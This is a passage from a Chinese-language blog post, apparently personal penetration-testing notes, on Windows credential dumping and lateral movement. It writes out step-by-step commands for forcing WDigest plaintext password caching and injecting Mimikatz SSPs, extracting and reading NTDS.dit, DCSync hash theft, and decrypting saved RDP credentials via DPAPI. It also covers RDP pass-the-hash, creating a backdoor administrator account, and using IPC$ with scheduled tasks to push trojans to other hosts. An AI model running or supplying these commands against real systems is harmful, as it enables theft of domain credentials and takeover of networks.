<p>使用最高管理员权限添加 UseLogonCredential 并赋值为 1，使内存中保存明文密码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/wL2qzTd.png" alt="x|900x150"><br>添加该值并且赋值为 1，如下效果即可。<br><img src="https://i.imgur.com/GUdSRnQ.png"></p>
<p>现在内存中会保存明文密码了，但是当前内存中没有，需要锁屏或者注销用户，让用户重新登陆之后才有。</p>
<p>锁屏(用这种方式抓不到 win10 的密码 最好注销用户)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>

<p>查询在线用户:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br></pre></td></tr></table></figure>

<p>注销用户:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logoff ID</span><br></pre></td></tr></table></figure>

<p>之后再次登录再查询<br><img src="https://i.imgur.com/MmmDM5l.png"></p>
<p>关闭:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<h3 id="内存注入-SSP"><a href="#内存注入-SSP" class="headerlink" title="内存注入 SSP"></a>内存注入 SSP</h3><p>Mimikatz 中，有写好的恶意的 SSP,可以提供本地认证时候对明文账号密码进行记录，只需要将 SSP 注入到系统内存中，就可以获取本地的明文账号密码，因为是注入内存所以重启后就失效了，这个攻击也叫 SSP 注入。</p>
<p>方法 1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz:</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/fYAAgEm.png"></p>
<p>方法 2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\InvokeMimikatz.ps1</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz-Command &quot;misc::memssp&quot;</span><br></pre></td></tr></table></figure>

<p>同样需要注销用户。用户重新登录之后在 C:\System32\ 目录下会存在 mimilsa.log 文件，记录明文密码。在 CS 上可能会没有权限查看这个文件(system 也没用),此时需要使用计划任务将该文件,换个位置，或者发送到 VPS。</p>
<p>创建 bat 文件，用于复制文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell echo copy C:\Windows\System32\mimilsa.log C:\Users\Administrator\Desktop\1.txt &gt;1.bat</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/arYznKP.png"></p>
<p>创建计划任务，执行 bat 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /tn copy /sc onstart /tr C:\Users\Administrator\Desktop\1.bat /ru system /f</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/Z8zrS0T.png"></p>
<p>运行计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /run /i /tn &quot;copy&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/HgdZwSf.png"></p>
<p>一定要创建计划任务，直接在 CS 运行这个 bat 文件不行。</p>
<h3 id="注册表添加-SSP"><a href="#注册表添加-SSP" class="headerlink" title="注册表添加 SSP"></a>注册表添加 SSP</h3><p>SSP 注入到内存中，有一个弊端就是在内存中，只要电脑重启了就会失效，如果想要永久生效就需要将 SSP 添加到注册表中，之后系统重启就会加载 SSP,这样就会获取明文账号密码。</p>
<p>1、在 Mimikatz 中有一个 mimilib.dll 文件，这个就是 SSP，将这个文件复制到 C:\Windows\System32 目录下</p>
<p>2、修改注册表，使得重新启动时加载 SSP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d mimilib.dll /f</span><br></pre></td></tr></table></figure>

<p>3、密码将会生成在 C:\Windows\System32\kiwissp.log</p>
<p>小问题:这个 dll 会被杀软杀掉</p>
<h1 id="域控密码抓取"><a href="#域控密码抓取" class="headerlink" title="域控密码抓取"></a>域控密码抓取</h1><h2 id="NTDS-文件介绍"><a href="#NTDS-文件介绍" class="headerlink" title="NTDS 文件介绍"></a>NTDS 文件介绍</h2><p>Active Directory 目录服务使用数据存储来存储所有目录信息。此数据存储通常称为目录。目录包含有关用户、组、计算机、域、组织单位和安全策略等对象的信息。这些信息可以发布以供用户和管理员使用。</p>
<p>目录存储在域控制器上，可以由网络应用程序或服务访问。一个域可以有一个或多个域控制器。每个域控制器都有其所在整个域的目录副本。对一个域控制器上的目录所做的更改将复制到域、域树或林中的其他域控制器。Active Directory 使用四种不同的目录分区类型来存储和复制不同类型的数据。目录分区包含域、配置、架构和应用程序数据。此存储和复制设计为整个域中的用户和管理员提供目录信息。</p>
<p>目录数据存储在域控制器上的 Ntds.dit 文件中。建议将此文件存储在 NTFS 分区上。有关用于管理 Active Directory 数据库和日志文件的工具的详细信息，请参阅Ntdsutil 中的文件。私有数据以安全方式存储，公共目录数据存储在共享系统卷上，可从中复制到域中的其他域控制器。有关复制的详细信息，请参阅复制概述。域控上的 ntds.dit 只有可以登录到域控的用户（如域管用户、DC 本地管理员用户）可以访问，为了进一步保护密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密。<br>该文件的位置:C:（域控上才有这个文件夹）</p>
<h3 id="卷影拷贝提取域控-NTDS"><a href="#卷影拷贝提取域控-NTDS" class="headerlink" title="卷影拷贝提取域控 NTDS"></a>卷影拷贝提取域控 NTDS</h3><p>从 Windows XP SP2 和 Windows Server2003 开始，微软就向 Windows 操作系统中引入了一项名叫卷影拷贝的服务(Volume Shadow Copy Service-VSS)。</p>
<p>这种服务允许 Windows 系统以自动或手动的方式对文件或磁盘卷宗的当前状态进行备份（或快照），需要注意的是，在这个过程中，&#x3D;&#x3D;即使文件处于打开状态下<br>该服务仍然可以直接进行文件备份&#x3D;&#x3D;，</p>
<p>Ntds.dit 是默认被 Windows 系统锁定的，想要读取该文件就要利用卷影拷贝服务(Volume Shadow Copy Service,VSS),得到 Ntds.dit 文件的副本。卷影拷贝服务(VSS)本质上是属于快照技术的一种主要用于备份和恢复，即使目标文件被处于锁定状态。</p>
<p>方式一:ntdlutils.exe</p>
<p>ntdsutil..exe 是一个为活动目录提供管理机制的命令行工具，该工具默认安装在域控服务器上，可以在域控制器上直接操作，2003、2008、2012、2016 等，提取 NTDS 过程分为 3 步。如果使用 CS，必须有 SYSTEM 权限。</p>
<p>创建快照:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/2QQpneO.png"></p>
<p>加载快照到磁盘中:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;mount 26e87b74-3c6f-46ea-9994-c85f9cf93b42&quot; q q</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/zsjJUbn.png"></p>
<p>复制 NTDS 文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202411041725_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\kzh\Desktop\ntds.dit</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/UqlwhNV.png"></p>
<p>移除挂载，删除快照:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe snapshot &quot;unmount &#123;26e87b74-3c6f-46ea-9994-c85f9cf93b42&#125;&quot; &quot;delete &#123;26e87b74-3c6f-46ea-9994-c85f9cf93b42&#125;&quot; q q</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/5paDsXN.png"></p>
<p>生成dit文件<br><img src="https://i.imgur.com/OQfSBtx.png"></p>
<h3 id="离线读取-NTDS"><a href="#离线读取-NTDS" class="headerlink" title="离线读取 NTDS"></a>离线读取 NTDS</h3><p>首先需要下载 NTDS 文件，而且还要转储 system.hive,和 sam 文件一样，需要 system.hive 中的密钥才能读取 NTDS 文件。</p>
<p>reg save hklm\system1 c:\windows\temp\system.hive</p>
<p>有了这两个文件之后就可以使用工具读取了：</p>
<p>secretsdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.exe -system sys.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>

<p>NTDSDumpEx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx -d ndts.dit -s sys.hive -o 1.txt</span><br></pre></td></tr></table></figure>

<p>只有账户 hash 值,还有很多方式和工具支持，顺手即可。</p>
<h3 id="在线读取-NTDS"><a href="#在线读取-NTDS" class="headerlink" title="在线读取 NTDS"></a>在线读取 NTDS</h3><p>直接用工具读取 NTDS 文件，但是可能会被杀软杀，而且因为域内可能用户较多导致文件大，如果网络不好可能会出问题。</p>
<p>mimikatz:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync/domain:abc.com /all /csv (读取所有)</span><br><span class="line">lsadump::dcsync/domain:abc.com /user:administrator (读取指定用户)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/DLeJLvQ.png"></p>
<p>QuarksPWDump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPWDump.exe --dump-hash-domain --ntds-file ntds.dit</span><br></pre></td></tr></table></figure>

<p>首先需要导出 ntds.dit 文件</p>
<h2 id="Dcsync-原理及攻击"><a href="#Dcsync-原理及攻击" class="headerlink" title="Dcsync 原理及攻击"></a>Dcsync 原理及攻击</h2><p>Dcsync(domain Controler synchronization):在内网中一般不是一个域控，会有域树或者域森林等，域控之间是要同步数据的，不同的域控 15 分钟之间要发起一次数据同步的请求，请求里面就包含同步的数据，这里采用的协议是 DRS(目录复制服务)，这个就是 DCsync。</p>
<p>2015 年 8 月，新版本的 Mimikatz,新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是不用登陆域控制器，即可远程通过域数据同步复制的方式获得域控制器上的的数据。这种攻击就叫做 DCsync 攻击。</p>
<p>关于 Dcsync 的利用思路</p>
<p>1、找到有权限的用户，从而远程读取域控用户信息，可以进行 PTH、黄金白银票据攻击</p>
<p>2、如果控制了域控，可以在域控添加一个管理员账号从而进行权限维持</p>
<p>3、可以添加一个普通的用户，修改 ACL 从而实现可以使用 Dcsync,进行权限维持。以下用户可以运行 DRS 服务：</p>
<ul>
<li>1.Administrators 组内的用户</li>
<li>2.Domain Admins 组内的用户</li>
<li>3.Enterprise Admins 组内的用户</li>
<li>4.域控制器的计算机帐户</li>
<li>5.域控 system</li>
</ul>
<h3 id="dcsync-远程读取域控-hash"><a href="#dcsync-远程读取域控-hash" class="headerlink" title="dcsync 远程读取域控 hash"></a>dcsync 远程读取域控 hash</h3><p>需要找到一个可以运行 drs 服务的用户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:gouzi.com /all /csv&quot; &quot;exit&quot;&gt;1.txt</span><br></pre></td></tr></table></figure>

<p>如果权限不够则出现下面的提示<br><img src="https://i.imgur.com/0VXCL0g.png"></p>
<p>secretsdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell secretsdump.exe 域名/administrator:密码@ip</span><br><span class="line"></span><br><span class="line">shell secretsdump.exe gouzi/administrator:admin123@192.168.192.10</span><br></pre></td></tr></table></figure>

<h3 id="dcsync-远程读取明文密码"><a href="#dcsync-远程读取明文密码" class="headerlink" title="dcsync 远程读取明文密码"></a>dcsync 远程读取明文密码</h3><p>其实有 HASH 足够了，但是如果在创建用户的时候勾选了”使用可逆加密存储密码”的属性，那么 dcsync 就可以直接读取出明文账号密码。</p>
<h2 id="RDP-密码抓取"><a href="#RDP-密码抓取" class="headerlink" title="RDP 密码抓取"></a>RDP 密码抓取</h2><p>原理</p>
<p>在平时的工作中，管理员为了方便管理计算机，经常会进行远程桌面连接，由于每次都需要输入密码觉得麻烦，就点击了保留凭据，这个过程是可逆，所以我们可以将保存的密码进行还原。</p>
<p>开启远程 3389</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber 查看 RDP 端口(<span class="number">0</span>xd3d 为 <span class="number">3389</span>)</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f 开启</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f 关闭</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\* :查看 RDP 凭据（可破解明文账号密码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还原的原理：Windows 通过 MasterKey 将密码加密后保存在本地，由于 Windows还需要解密使用这个密码，所以这个过程是可逆，也正因为这一缘由，我们只要拿到 MasterKey 就能将密码解出来。</p>
<p>寻找、查看 RDP 凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看 RDP 连接记录</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">查找本地 Credentials</span><br><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/I8Ankov.png"></p>
<p>在线读取</p>
<p>1、读取凭据,找到 Matserkey 的 guid 值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/OOtsn6J.png" alt="x|700x250"></p>
<ul>
<li>36100E4F8DF719F103EAECB55C8B2DBB</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\36100E4F8DF719F103EAECB55C8B2DBB</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/vMBRWdY.png" alt="x|700x250"></p>
<ul>
<li>确认guid:{6306f025-f7b1-4720-85b6-63394deeae61}</li>
</ul>
<p>2、根据 guid 找到内存中的 Materkey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/fxAD4BT.png" alt="x|900x400"><br><img src="https://i.imgur.com/8A4xmVl.png" alt="x|900x250"></p>
<ul>
<li>MasterKey:97725b268216595b2fc6fdb1c5e03c39dff5ff56b7cbd3dd656feff0525f31eef00bcafb4260554982b967072d06bc2e47509cb98f79fd08cdc115f449b71a9a</li>
</ul>
<p>3、利用 masterkey 值解密 RDP 凭据密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\36100E4F8DF719F103EAECB55C8B2DBB /masterKey:97725b268216595b2fc6fdb1c5e03c39dff5ff56b7cbd3dd656feff0525f31eef00bcafb4260554982b967072d06bc2e47509cb98f79fd08cdc115f449b71a9a</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/skX6GcZ.png" alt="x|700x250"><br><img src="https://i.imgur.com/ujDA0HP.png" alt="x|700x250"></p>
<ul>
<li>破解出账号密码</li>
</ul>
<h2 id="应用软件密码抓取"><a href="#应用软件密码抓取" class="headerlink" title="应用软件密码抓取"></a>应用软件密码抓取</h2><h3 id="浏览器密码抓取"><a href="#浏览器密码抓取" class="headerlink" title="浏览器密码抓取"></a>浏览器密码抓取</h3><p>浏览器中保存着账号密码、历史记录、书签等重要信息，这些信息对内网渗透也很重要。</p>
<p>下面两种工具皆为直接运行即可，使用方法非常简单，原理就是找到浏览器保存数据的路径，然后解密。</p>
<p>1、BrowserGhost</p>
<p>可抓取浏览器密码，实现 system 抓机器上其他用户的浏览器密码。主要针对谷歌。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-TEAM/BrowserGhost">https://github.com/QAX-A-TEAM/BrowserGhost</a></p>
<p>2、Sharp-HackBrowserData</p>
<p>可抓取谷歌、火狐、IE 等常见浏览器的密码。</p>
<p>地址:<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
<p>3、其他软件密码抓取</p>
<ul>
<li>SharpDecryptPwd-master 对密码已保存在 Windows 系统上的部分程序进行解析，包括 Navicat,TeamViewer,FileZilla,VinSCP,Xmangager 系列产品</li>
<li>LaZagne是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（明文、AP、自定义算法、数据库等)存储其密码。开发此工具的目的是为最常用的软件查找这些密码。以上工具 CS 插件中集成。</li>
</ul>
<h2 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h2><p>在内网渗透中，域内横向移动是一种常见的攻击手法。攻击者会利用此技术，以被攻陷的系统为跳板，访问域内其他主机，扩大资产(包括跳板机中的文档和存储的凭证，以及通过跳板机连接的数据库，域控制器等其他重要资产)。通过此类攻击技术，攻击者最终很可能获取到域控制器的访问权限，甚至控制整个内网的机器权限。</p>
<p>横向移动的目标一般需要选择具有价值的机器，例如域控、域管理员登录过的服务器、运维机器、文件服务器、数据库服务器、OA 系统服务器、重要个人电脑等。</p>
<p>横向移动常见的方法：<br>• WEB 漏洞<br>• 系统漏洞<br>• 远程桌面<br>• 账号密码（PTH、PTT、PTK、WMIC…）<br>• 不安全的配置（比如 dcsync 滥用、委派滥用）</p>
<h3 id="远控软件"><a href="#远控软件" class="headerlink" title="远控软件"></a>远控软件</h3><p>为了图形化控制对方机器。</p>
<h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><p>远程桌面协议(RDP)是一个多通道(multi-.channel)的协议，让使用者（所在计算机称为用户端或’本地计算机)连上提供微软终端机服务的计算机（称为服务端或’远程计算机’）远程桌面的利用条件：</p>
<p>1、开启了 3389 端口</p>
<p>2、防火墙等安全设备没有禁止</p>
<p>3、网络畅通</p>
<p>4、拥有账号和密码或者 Hash，（可以是本身的账号也可以是自己添加的)</p>
<p>方法一：</p>
<p>查询注册表 查看 RDP 端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; /v PortNumber   查看 RDP 端口(0xd3d 为 3389)</span><br></pre></td></tr></table></figure>

<p>查看 RDP 功能是否启用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p>如果未启用 修改注册表启用 RDP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>抓取机器明文密码登录即可:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>方式二：</p>
<p>借助 mimikatz 使用 hash 登录(属于 pth 的一种):</p>
<p>查询注册表，看看是否开启 Restricted Admin mode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\System\CurrentControlSet\Control\Lsa</span><br></pre></td></tr></table></figure>

<p>开启 Restricted Admin mode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>privilege::debug</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:zs /domain:192.168.197.20 /ntlm:f31f1532113ca4a22e0a87426713d565&quot; /run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意，使用 rdp 的 pth 攻击时，关于 RestrictedAdmin Mode 的使用，需</li>
</ul>
<p>要连接双方都支持该功能。（自 Windows8.1 之后支持该功能，如果</p>
<p>WS2012 等，但是部分家庭版不支持，如 win10 家庭版）</p>
<p>方式三：</p>
<p>创建账户进行远程桌面连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack@123 /add</span><br><span class="line"></span><br><span class="line">net localgroup Administrators hack /add</span><br></pre></td></tr></table></figure>

<p>RDP 登录之后可以查看当前机器 RDP 记录、SSH 连接程序等，如果有则直接横向</p>
<h2 id="IPC-横向移动"><a href="#IPC-横向移动" class="headerlink" title="IPC$横向移动"></a>IPC$横向移动</h2><h3 id="概述和连接方式"><a href="#概述和连接方式" class="headerlink" title="概述和连接方式"></a>概述和连接方式</h3><p>IPC(Internet Process Connection)共享，是为了实现进程间通信而开放的命名管道。</p>
<p>IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。通过 ipc$,可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p>
<p>文件共享是指主动在网络上共享自己的计算机文件。而每台计算机都会有默认共享的情况，包括所有的逻辑盘（C$、D$、E$、admin$），只需要知道对方的账号密码，可以实现对这些默认共享目录的访问。而如果当前用户的账号是 administrator，目标机器的账户 administrator密码与当前用户的一致，不需要输入密码就可以访问，默认会用本地相同的账号密码进行认证。(非最高管理员权限不够，提示拒绝访问。)</p>
<p>&#x3D;&#x3D;而在内网中，可能存在很多机器的本地 administrator 用户密码是一样的，所以能够直接利用。&#x3D;&#x3D;</p>
<p>如果双方建立了 IPC 连接，则共享文件无需再进行认证。</p>
<p>关于 IPC 的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">建立 IPC 连接</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;password&quot; /user:username</span><br><span class="line"></span><br><span class="line">net use \\域名\ipc$ &quot;password&quot; /user:域用户</span><br><span class="line"></span><br><span class="line">net use \\192.168.255.10\ipc$ &quot;Win.2024&quot; /user:KEA\Administrator</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ezYAnTB.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">删除 ipc 连接</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ /del</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/Sgg8BQc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">关闭共享</span><br><span class="line"></span><br><span class="line">net share IPC$ /del</span><br><span class="line"></span><br><span class="line">开启共享</span><br><span class="line"></span><br><span class="line">net share IPC$</span><br><span class="line"></span><br><span class="line">自定义共享</span><br><span class="line"></span><br><span class="line">net share kzh=C</span><br></pre></td></tr></table></figure>


<blockquote>
<p>[!NOTE] 利用条件</p>
<ol>
<li>开启了 139、445 端口<ul>
<li>iPC$可以实现远程登录及对默认共享资源的访问，445 端口可以实现对共享文件打印机的访问。因此，一般来讲需要 445 端口的支持。</li>
</ul>
</li>
<li>管理员开启了默认共享 <ul>
<li>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c$、d$、e$、admin$)可以实现对这些默认共享目录的访问(net share)</li>
</ul>
</li>
<li>必须知道对方机器的用户名和密码</li>
</ol>
</blockquote>
<p>不同用户 ipc$的命令权限,ipc 连接建立之后可以执行很多命令，如：</p>
<ul>
<li><code>tasklist /S ip</code>  查看进程<ul>
<li><img src="https://i.imgur.com/WtqXDYl.png" alt="x|600x250"></li>
</ul>
</li>
<li><code>dir \\ip\c$</code>  列目录<ul>
<li><img src="https://i.imgur.com/iPZ1EbK.png" alt="x|600x250"></li>
</ul>
</li>
<li><code>type \\ip\c$\1.exe</code>  查看文件<ul>
<li><img src="https://i.imgur.com/lqcOQaW.png"></li>
</ul>
</li>
<li><code>copy 1.exe \\ip\c$</code>  复制文件<ul>
<li><img src="https://i.imgur.com/P43vKKI.png"></li>
</ul>
</li>
</ul>
<p>排除本机的影响，对于不同目标用户建立 ipc 连接权限是不一样的，大致如下：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>域</th>
<th>域管理员</th>
<th>域内用户</th>
<th>本地</th>
<th>本地管理员</th>
<th>本地用户</th>
</tr>
</thead>
<tbody><tr>
<td>dir、type</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>copy</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<blockquote>
<p>[!NOTE] 一点例外<br>在Windows Server 2003及老版本的Windows电脑中，使用普通管理员进行IPC连接之后即可对文件进行操作(如dir copy type)</p>
</blockquote>
<blockquote>
<p>[!NOTE]</p>
<p>域成员-&gt;域管理员：<br><img src="https://i.imgur.com/r2iH9O2.png"></p>
<p>本地-&gt;域管理员<br><img src="https://i.imgur.com/TqAaVQw.png"></p>
<p>本地-&gt;域成员<br><img src="https://i.imgur.com/agv2eNC.png"></p>
</blockquote>
<h3 id="ipc-配合计划任务"><a href="#ipc-配合计划任务" class="headerlink" title="ipc$配合计划任务"></a>ipc$配合计划任务</h3><p>如果我们能以高权限用户和域内其他主机建立 ipc 连接，那么就可以将木马上传至其他主机中，这时只要执行这个木马即可使其他主机上线，而使用计划任务，可以执行程序。</p>
<p>在 Windows XP 之前使用 at 命令创建计划任务，之后使用 schtasks 命令。</p>
<p>计划任务是允许远程创建的，也就是说 A 机器可以在 B 机器上创建计划任务，前提是需要账号密码。但是 at 命令不需要。</p>
<p>注意，&#x3D;&#x3D;建立 IPC 连接和创建计划任务最好不要使用 CS 上的 systemshell。&#x3D;&#x3D;</p>
<ol>
